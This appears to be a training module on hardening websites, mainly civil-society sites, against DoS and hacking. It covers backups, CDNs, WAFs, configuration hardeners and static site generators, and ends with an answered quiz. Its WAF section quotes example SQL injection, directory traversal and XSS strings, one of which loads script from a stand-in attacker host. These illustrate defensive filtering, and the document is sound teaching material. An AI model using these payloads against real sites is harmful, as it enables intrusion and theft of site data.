+++
style = "module"
weight = 1
title = "Website Hardening"
description = "We explore some initial steps you can take to make your website more resilient to attack"
+++

## Use Case

There are a number of steps that can be taken to a website as a whole to make it more resilient to attack. These typically require less effort than going through the site page-by-page and can be quite impactful, so generally it’s a good idea to go through these actions first.

## Objectives

After completing this subtopic, the practitioner should be able to do the following:

- Use development and maintenance processes that ensure that their site can be re-created if the production hosting servers are unavailable.
- Use CDNs (content delivery networks) to protect their website from DoS attacks
- Use static site generators to make their site more resistant to DoS and hacking
- Use configuration hardeners and WAFs to make their site more resistant to hacking

---
## Main Section

This sub-skill covers fundamental, site-wide activities that should be performed on almost any site that wishes to be protected against attacks. While every action may not apply to every site, some apply to all sites, and all apply to some.

### How website DoS attacks work

One of the key themes of this Learning Path is DoS attacks. In order to understand how to defend against and respond to these attacks, we need to understand how they work.

#### Attack Types

DoS attacks can be broken down broadly by what layer of the application stack the attack targets, and whether the attack is volumetric or if it exploits bugs in the target software.

##### Network-level attacks

The lowest-level DoS attack type operates on the network level. The target of these attacks is the network connections between computers, routing equipment, and/or the operating system on the target. In a volumetric attack, the attacker will just send tons of network traffic to the target, trying to overwhelm the network or switching/routing capacity of the network devices connecting the target to the internet. Examples of this sort of attack are [ping floods](https://en.wikipedia.org/wiki/Ping_flood), [smurf attacks](https://en.wikipedia.org/wiki/Smurf_attack), and [NTP amplification attacks](https://www.cloudflare.com/learning/ddos/ntp-amplification-ddos-attack/).

From time to time a bug is found in a network device or server operating system that allows more efficient DoS attacks. These range from the classic “[ping of death](https://en.wikipedia.org/wiki/Ping_of_death)” from the 90’s, where a single packet could cause a server to crash, to more modern [hash collision issues](https://www.enyo.de/fw/security/notes/linux-dst-cache-dos.html).

##### Protocol-level attacks

One step up the network stack is protocol-level attacks. For web sites, these attacks will all use HTTP to try to overwhelm the web server or its backend infrastructure. Volumetric attacks are similar to network-level attacks; attackers just cause a large flood of traffic.

There also exist exploit-based DoS attacks at the protocol level; generally attacking the web server software. One example is the [HTTP slow POST attack](https://www.educative.io/answers/what-is-slow-http-post-dos-attack).

##### Application-level attacks

The final class of DoS attack is the kind that attacks a resource-expensive feature of the target website itself. Since it’s specific to the target site, this kind of attack requires more technical skills than the other types, but can be extremely effective and hard to stop. In these attacks, the threat actor will identify a function on the web site that takes a lot of resources on the server side. Examples might include a page that resizes an image (can consume a lot of server memory), sends emails (can consume disproportionate network resources and affect mail server reputation), performs a complicated search (can consume a lot of database CPU and cache), etc.

These attacks usually serve to dramatically reduce the cost of a DoS attack to the attacker. Instead of sending tens or hundred of thousands of requests per second, the attacker may be able to render a web server unresponsive with mere hundred of requests per second. Not only does this reduce the cost of the attacker in terms of requests sent, the attacker can hide their traffic more easily, since the overall traffic volume may not be significant. Also, stopping these attacks usually requires changes to the site itself, which in some cases may be quite extensive.

#### DoS vs DDoS

A DDoS (distributed denial of service) attack is a type of DoS attack where the malicious traffic comes from a large number of sources. This is as opposed to a conventional attack, where a small number of computers send out the malicious traffic. As defenders have gained skills and abilities, effective attacks are generally DDoS attacks, as conventional attacks are easy to block, and frequently do not generate sufficient traffic. Most DDoS attacks involve attackers renting time on an existing [botnet](https://en.wikipedia.org/wiki/Botnet) or hiring a dedicated[ DDoS-for-hire service](https://krebsonsecurity.com/category/ddos-for-hire/), though some extortion gangs will have their own botnets.

### Development and Site Maintenance Practices

The most fundamental thing to help prepare for and respond to attacks is to be able to rebuild the site from scratch. This is important in DoS attacks, as the site may not just be unavailable to end users, but also to site owners. In some cases, hosting providers will take down a site that’s under attack, so as to prevent their systems from being overloaded. In a hacking attack, having a “clean” copy of the site is often essential for forensics and also for post-attack cleanup.

#### Version Control

Site code and static content should be stored in a server-based version control system. Site developers are often attack targets themselves. For example, an [Azerbaijani web site owner was a victim of a phishing attack, and the attacker used their access to put a backdoor on the victim’s web site](https://www.qurium.org/alerts/targeted-sophisticated-phishing-attacks-against-dissidents-in-azerbaijan-is-trending/). Having a version control system, especially an externally managed one, can limit the impact of a compromise of a site maintainer. Additionally, having code and content stored remotely has other advantages if an accident, such as the loss of a laptop, occurs. Services such as [GitHub](https://docs.github.com/en) and [GitLab](https://about.gitlab.com/resources/) have free tiers that support the needs of individuals and small organizations.

#### Replicated Development Setup

If possible, site maintainers should have an isolated, access controlled environment where they can make and test changes to their website. This may be as simple as an unpublished, password-protected site on a provider like Wordpress.com or Wix, or a full multi-container Docker setup that allows a developer to have a complete environment on their laptop. In any case, making changes in production during an attack may be difficult or impossible, and it’s very easy to make mistakes in a high-stress situation. Having a separate development environment will allow site maintainers to make and test changes in a safe place before deploying those changes to production.

#### Database backups

If the website has a database, it’s important that that database be backed up and that those backups are tested. Ideally, backups should be made automatically, and old backups stored. That way, if an attacker manages to use a vulnerability like SQL injection to corrupt the database, a clean version can be restored, even if the attack isn’t detected immediately. If the database is small, it can be stored in the site’s version control system. Larger backups can be safely and inexpensively stored in systems like [AWS S3](https://aws.amazon.com/s3/) or [GCP’s Cloud Storage](https://cloud.google.com/storage?hl=en#backups-and-archives). The storage system, of course, needs to have access control enabled. Ideally, the processes that back up the data should only have permissions to add new files to the storage, not read, write, or delete existing data.

### Using DoS resistant CDNs or hosting

Since denial of service attacks are the most common threat facing civil society websites, a site owner’s next priority should be to set up basic defenses against DoS attacks. There are two ways of doing this: using a CDN with DoS protection or using a DoS-resistant hosting provider.

#### DoS resistant CDNs

CDNs (content delivery networks) originally served as a way to serve static web resources faster and with lower server costs. They were generally used by high-traffic websites. Usually, the website owner will use a special hostname (e.g. images.example.com) and give DNS control of that hostname to the CDN provider. The CDN provider has a large network of web servers, ideally placed near (in terms of network topology) to end users. These servers are called “edge” servers. When an end user performs a DNS lookup for that hostname, the CDN provider’s servers respond with the IP address of the “closest” CDN edge server. When the end user requests a resource (web page, image, sound file, etc.) from the edge server, the edge server first sees if it has the resource in its cache. If not, it requests the resource from the original website (called the “origin” server) and stores it in the cache. Once it has the resource in its cache, then it can serve it back to the end user. On subsequent requests, it will respond immediately with the cached resource. On a high-use website, this reduces load on the origin server and also results in lower network latency.

Over time the usefulness of CDNs for DoS protection became apparent. CDNs have lots of bandwidth capacity and specialized web server software, so can shrug off the onslaught of traffic from DoS attacks. This stops network level attacks, and most protocol-level attacks against static web content. For protection against protocol-level attacks against any page, websites will serve all content through the CDN, as opposed to just static content. Since the CDNs offer protection to multiple customers, they can develop specialized tools, techniques, and expertise in detecting and blocking DoS attacks.

Examples of DoS resistant CDN solutions include [Deflect](https://deflect.ca/non-profits/), [Project Shield](https://projectshield.withgoogle.com/landing), [Fastly](https://www.fastly.com/fast-forward), and [CloudFlare](https://www.cloudflare.com/galileo/).

One important caveat of using a CDN to protect your website from DoS attacks is that it is imperative that you restrict traffic to your origin web servers. Let’s say that your web site, served through a CDN, uses the hostname [www.example.com](http://www.example.com), and you use origin.example.com for your “real” origin web server. If an attacker launches a DoS attack against origin.example.com, they will completely bypass the CDN, and your site will receive no benefit. Instead, origin web servers should have IP address restrictions in place at the network level (e.g. via a firewall), or ideally be completely cut off from the Internet and only accessible via a VPN.

Additionally, there are certain misconfigurations that can cause a CDN edge server to not recognize static vs dynamic content. For example, if a website has a web page like [www.example.com/profile](http://www.example.com/profile), the CDN doesn’t automatically know that the page contains private information. The most standard way to work around this is to configure the CDN to cache based on response headers and then set a `Cache-Control` header whose value is `private` or similar. This will tell the CDN that the page contains private information, and to not give the same content to different users. The specifics of how this is configured and used will vary between CDN providers, so be sure to consult your provider’s documentation before setting up a CDN. It’s also a good idea to have a pre-release site that’s configured with the same CDN and settings as the production site. In this way, site managers can check major changes before going live.

#### DoS resistant hosting

Some providers combine web hosting with DoS resistance. Generally they have some of the same sort of technologies and practices that CDN providers use but bundled with web hosting. This avoids the issue above of protecting origin servers but depends on the provider providing both the protection and hosting services you need. Examples of DoS resistant hosting providers include [Qurium](https://www.qurium.org/secure-hosting/) and [Greenhost](https://greenhost.net/internet-freedom/).

#### Limitations of DoS resistant CDN and hosting providers

You may have noted that the protection provided by DoS resistant CDN and hosting providers covers the majority of attacks, but the above material left out application-level attacks. There may be flaws in a website that allow DoS attacks with very low volumes. Standard defenses against DoS attacks are not effective in this case. That said, support and rapid response personnel at CDN and hosting providers may be able to help support web site owners in the event that there is an active application-level DoS attack against their website.

Defending against application-level attacks is covered in more depth in the DoS Incident Response subtopic (subtopic 3 in this learning path).

### Using Web Application Firewalls

WAFs (web application firewalls) are network devices that sit in between an end user and a website’s origin server, like a CDN. While a CDN provides protection against DoS attacks, a WAF attempts to protect against hacking attacks. They will inspect incoming requests and block ones that look malicious, for example parameters containing things like `' or 1=1;--` (SQL injection), `"><script src="http://attacker.com/payload.js"><z a="` (XSS), or `../../../../../../etc/passwd` (directory traversal). While no WAF can provide perfect protection against hacking, they may be effective enough to protect a site from compromise, and almost always make the attacker’s job of identifying vulnerabilities more difficult. In most cases, a good WAF will not disrupt legitimate content, but it is possible for them to do so. For example, if a site was a discussion forum talking about secure web development, a WAF would likely block legitimate posts about attack techniques. As with CDNs, it’s a very good idea to have a pre-release site where changes can be tested before they go live.

Most DoS resistant CDNs also have WAF functions. There are also dedicated WAF providers who provide extra services, generally including DoS protection. For example, [Sucuri](https://sucuri.net/website-firewall/) is a WAF provider that also provides DoS protection and some backup and incident response capabilities. [WordFence](https://www.wordfence.com/products/pricing/) is a WAF provider that specializes in protecting sites built on WordPress. In addition to attempting to block generic hacking attempts and DoS attacks, it attempts to block attacks that specifically target WordPress sites.

There are also WAFs that are meant to be run on the same server or the network as the web site they’re protecting. Examples include expensive products by Barracuda and F5, and also open-source solutions such as [ModSecurity](https://github.com/SpiderLabs/ModSecurity). Note that these systems generally do not provide DoS protection on their own.

### Configuration Hardeners

Websites almost universally are built on some sort of framework that handles most of the work of serving web pages. That might be a low-level framework, like nginx, that only handles networking and basic HTTP, or a very high-level framework like WordPress, that handles everything except site content. In the vast majority of cases, the framework provides a suite of features, capabilities, and other configuration options, most of which aren’t needed by the website. These unneeded features and configurations expose the website to additional risk through increased attack surface (and potential for exposed bugs) or insecure configurations themselves.

While it’s possible to manually study the capabilities of a framework and decide how to enable features and configurations on one’s own, it’s generally far easier and more effective to use a tool or set of default baselines. These configuration hardeners usually represent thousands of hours of work to lock down a system as much as possible without rendering it unusable.

As with any system changes, it’s good, perhaps necessary, to have a separate environment in which to test changes, as well as a test process to make sure everything works properly before deploying changes to production. A site may depend upon an insecure configuration or little-used feature to work properly. In that case, it’s better to catch that before putting a reconfigured site in use.

The [DevSec Hardening Framework](https://dev-sec.io/baselines/) provides a set of security baselines for hardening a wide variety of commonly-used infrastructure software, such as Linux, MySQL, Apache, Docker, etc. Their baselines are documented on the web site, and they provide recipes for configuration managers such as Chef, Puppet, and Ansible.

Other configuration hardeners go much deeper into the frameworks they secure. An example is [Snuffleupagus](https://snuffleupagus.readthedocs.io/), which secures PHP installations. In addition to supplying configuration changes, it changes the behavior of functions to make them less dangerous. For example, it changes the `system()` function to remove potentially dangerous characters from its input, and the `mail()` function to disallow features that can be used to write arbitrary files.

While configuration hardeners can’t eliminate every vulnerability from a website, and using them requires careful testing of the site afterwards, they are one of the easiest ways to shut down or slow down exploitation of a site.

### Static Site Generators

Many websites use a content management system to manage the site, even though the content on the site doesn’t change for each visitor. While there are definitely sites that need to be updated multiple times a minute, or customize content for each visitor, most are essentially static sites. In this case, “static” means usually being updated every few hours or less. For convenience, most of these sites are dynamically generated on each visit. For normal use, that’s absolutely fine. However, for a site that’s being targeted, it presents some problems.

First of all, that dynamic behavior exposes more attack surface to adversaries. Instead of just being a web server and some files, the site is a complicated set of dynamic behavior backed up by a combination of files and databases. The latter is much more likely to contain a vulnerability that could be exploited by an attacker.

Secondly, that complex assembly of databases and scripts takes much longer to generate a HTTP response than a static site. This additional processing complexity makes denial of service attacks much more effective.

In short, if a website can work as a static site, it will be much more resilient as a static site than as a dynamic site. It also expands the site’s hosting options and lowers hosting costs, as the site can be served with things like cloud providers’ storage buckets, GitHub pages, etc.

Some static site generators have their own simple structure for site content, generally relying on a bunch of Markdown files, some HTML styling templates, and some configuration files. However, many content-management systems will use a static site generator on the backend to produce the final web site. Of course, it’s also possible to just maintain the source files in git or the like. In any case, site owners will make changes to the web site configuration, then generate, test, and upload the full static site for every change. Examples of some popular standalone static site generators include [Hugo](https://gohugo.io/) and [Jekyll](https://jekyllrb.com/). For content management, examples of CMSes that use static site generators include [Cloud Cannon](https://cloudcannon.com/jamstack-ecosystem/static-site-generators/) or [Static CMS](https://www.staticcms.org/docs/add-to-your-site).

The downside of migrating to a static web site generator like Hugo or Jekyll is that you have to migrate your existing content. For websites using a different CMS, this can be a lot of work. It may be possible to use a static site generator for your existing platform, though. One popular example is [WP2Static](https://wp2static.com/), an [open-source](https://github.com/elementor/wp2static) WordPress plugin that will turn a WordPress site into a static one. There’s still migration that may be needed, [contact forms](https://wp2static.com/docs/basics/contact-forms-for-static-sites/) will need to be changed, and will need to be migrated to a 3rd party service like [Disqus](https://help.disqus.com/en/articles/1717131-importing-comments-from-wordpress), [ReplyBox](https://getreplybox.com/docs/importing-wordpress-comments/), or many others. Note that using a 3rd party commenting service will put another party in control of your site users’ comments.

## Skill Check

Website hardening plays a critical role in safeguarding online assets against various cyber threats. This set of challenging multiple-choice questions explores the core concepts of website hardening, focusing on key strategies and technologies aimed at enhancing the resilience of web applications against common vulnerabilities. From development and maintenance processes ensuring site availability to the implementation of content delivery networks (CDNs) and static site generators, these questions delve into the intricacies of fortifying websites against hacking attempts.

Test your knowledge of website hardening practices and gain insights into the essential measures to bolster the security posture of your online platforms.If possible, discuss your answers to those questions with a peer or Mentor who will help verify that you’ve correctly understood the topic.

1. What development and maintenance process ensure a website can be recreated if production hosting servers are unavailable?

A) Regularly updating website plugins and themes\
B) Implementing multi-factor authentication for admin accounts\
C) Using version control systems and automated backups\
D) Enforcing strict password policies for user accounts

{{< question title="Answer and explanation" >}}
1. Correct Answer: C) Using version control systems and automated backups

Explanation: Using version control systems (such as Git) and automated backups ensures that the website's codebase and data are securely stored and can be easily restored in case of server failures or data loss. This practice helps maintain the integrity of the website and minimizes downtime.
{{< /question >}}

2. How can a CDN (Content Delivery Network) help protect a website from Denial of Service (DoS) attacks?

A) By distributing website content across multiple servers to handle traffic spikes\
B) By encrypting all data transmitted between the server and client\
C) By providing additional layers of authentication for user logins\
D) By automatically blocking access to suspicious IP addresses

{{< question title="Answer and explanation" >}}
2. Correct Answer: A) By distributing website content across multiple servers to handle traffic spikes

Explanation: A CDN (Content Delivery Network) helps protect a website from DoS attacks by distributing its content across multiple servers located in various geographic locations. This distribution helps distribute the incoming traffic load, reducing the impact of DoS attacks and ensuring that the website remains accessible to users even during periods of high traffic.
{{< /question >}}

3. Which technology can enhance a website's resistance to DoS (Denial of Service) and hacking by serving pre-rendered HTML pages to users?

A) Serverless computing platforms\
B) Dynamic web application frameworks\
C) Content Management Systems (CMS)\
D) Static site generators

{{< question title="Answer and explanation" >}}
3. Correct Answer: D) Static site generators

Explanation: Static site generators create websites by generating HTML pages from source files during the build process. Since static sites do not rely on server-side processing or databases, they are inherently more resistant to hacking and DoS attacks. Static sites are also typically faster to load and easier to cache, further enhancing their resilience to attacks.
{{< /question >}}

4. How do configuration hardeners and WAFs (Web Application Firewalls) contribute to making a website more resistant to hacking?

A) By optimizing server performance and resource usage\
B) By implementing additional layers of authentication for user logins\
C) By automatically detecting and blocking known attack patterns and suspicious traffic\
D) By encrypting all data transmitted between the server and client

{{< question title="Answer and explanation" >}}
4. Correct Answer: C) By automatically detecting and blocking known attack patterns and suspicious traffic

Explanation: Configuration hardeners and WAFs (Web Application Firewalls) help make a website more resistant to hacking by automatically detecting and blocking known attack patterns and suspicious traffic. These security measures act as a barrier between the website and potential attackers, filtering incoming requests and traffic to prevent malicious activities and unauthorized access.
{{< /question >}}

## Learning Resources

{{% resource title="Ping flood" languages="English, Chinese, Japanese, Russian, Ukrainian, Greek, Indonesian, Catalan, Spanish, French, Italian, Dutch, Polish, Portuguese, Turkish, Czech" cost="Free" description="A description of a common denial of service attack." url="https://en.wikipedia.org/wiki/Ping_flood" %}}

{{% resource title="Smurf attack" languages="English, Arabic, Farsi, Japanese, Korean, Greek, Indonesian, Catalan, German, Spanish, Basque, French, Italian, Lombard, Dutch, Polish, Portuguese, Slovenian, Finnish, Czech" cost="Free" description="A description of another common denial of service attack, includes examples and mitigations." url="https://en.wikipedia.org/wiki/Smurf_attack" %}}

{{% resource title="NTP amplification attack" languages="English, German, Spanish, French, Italian, Japanese, Korean, Portuguese, Chinese, Taiwanese" cost="Free" description="An overview of how the network time protocol (NTP) could be abused for denial of service attacks." url="https://www.cloudflare.com/learning/ddos/ntp-amplification-ddos-attack/" %}}

{{% resource title="Ping of death" languages="English, Arabic, Farsi, Chinese, Japanese, Korean, Bulgarian, Russian, Ukrainian, Greek, Azeri, Indonesian, German, Spanish, French, Italian, Dutch, Polish, Portuguese, Romanian, Czech, Hebrew" cost="Free" description="An attack in which a computer is overwhelmed by a malicious ping." url="https://en.wikipedia.org/wiki/Ping_of_death" %}}

{{% resource title="Algorithmic Complexity Attacks and the Linux Networking Code" languages="English" cost="Free" description="A look at how Linux handles networking and a specific attack that could be directed against it." url="https://www.enyo.de/fw/security/notes/linux-dst-cache-dos.html" %}}

{{% resource title="What is slow HTTP post DOS attack?" languages="English" cost="Free" description="An overview of a denial of service attack which exploits some features in HTTP POST requests." url="https://www.educative.io/answers/what-is-slow-http-post-dos-attack" %}}

{{% resource title="Botnet" languages="48 languages" cost="Free" description="An overview of what a botnet is, or a group of automatically managed internet-connected devices used for malicious purposes." url="https://en.wikipedia.org/wiki/Botnet" %}}

{{% resource title="DDoS for hire" languages="English" cost="Free" description="A collection of blog posts by Brian Krebs on the DDoS for hire industry." url="https://krebsonsecurity.com/category/ddos-for-hire/" %}}

{{% resource title="Targeted sophisticated phishing attacks against dissidents in Azerbaijan is trending" languages="English" cost="Free" description="A 2020 Qurium report about an attacker who broke into a website and then used the data to phish dissidents." url="https://www.qurium.org/alerts/targeted-sophisticated-phishing-attacks-against-dissidents-in-azerbaijan-is-trending/" %}}

{{% resource title="Deflect for nonprofits" languages="English" cost="Free" description="Deflect is a DDoS protection program which allows nonprofits to sign up for free." url="https://deflect.ca/non-profits/" %}}

{{% resource title="Google Project Shield" languages="English" cost="Free" description="A free DDoS protection service for news, human rights, and election-related sites." url="https://projectshield.withgoogle.com/landing" %}}

{{% resource title="Cloudflare Project Galileo" languages="English, German, Spanish, French, Italian, Japanese, Korean, Portuguese, Chinese, Taiwanese" cost="Free" description="Pre DDoS protection and other security measures for at-risk sites, including artistic groups, humanitarian organizations, and political dissidents." url="https://www.cloudflare.com/galileo/" %}}

{{% resource title="Secure hosting for at risk sites: Qurium" languages="English" cost="Varied, depending on hosting package" description="Qurium and Greenhost both offer hosting for groups which might be at risk of attacks due to their human rights and media work." url="https://www.qurium.org/secure-hosting/" %}}

{{% resource title="Secure hosting for at risk sites: Greenhost" languages="English" cost="Varied, depending on hosting package" description="Qurium and Greenhost both offer hosting for groups which might be at risk of attacks due to their human rights and media work." url="https://greenhost.net/internet-freedom/" %}}

{{% resource title="Web application firewalls: Sucuri" languages="English" cost="Varied" description="Network devices that sit between an end user and a website’s origin server, like a CDN, providing an additional layer of security." url="https://sucuri.net/website-firewall/" %}}

{{% resource title="Web application firewalls: WordFence" languages="English" cost="Varied" description="Network devices that sit between an end user and a website’s origin server, like a CDN, providing an additional layer of security." url="https://www.wordfence.com/products/pricing/" %}}

{{% resource title="Web application firewalls: ModSecurity" languages="English" cost="Varied" description="Network devices that sit between an end user and a website’s origin server, like a CDN, providing an additional layer of security." url="https://github.com/SpiderLabs/ModSecurity" %}}

{{% resource title="Web application hardeners: a hardening framework" languages="English" cost="Free" description="Automated tools which find potential vulnerabilities in web applications." url="https://dev-sec.io/baselines/" %}}

{{% resource title="Web application hardeners: Snuffleupagus" languages="English" cost="Varied, many free options" description="Automated tools which find potential vulnerabilities in web applications." url="https://snuffleupagus.readthedocs.io/" %}}

{{% resource title="Static site generators" languages="English" cost="Free" description="An overview of major static site generators." url="https://cloudcannon.com/jamstack-ecosystem/static-site-generators/" %}}

{{% resource title="WP2Static" languages="English" cost="Free" description="A WordPress plugin to generate static sites." url="https://wp2static.com/" %}}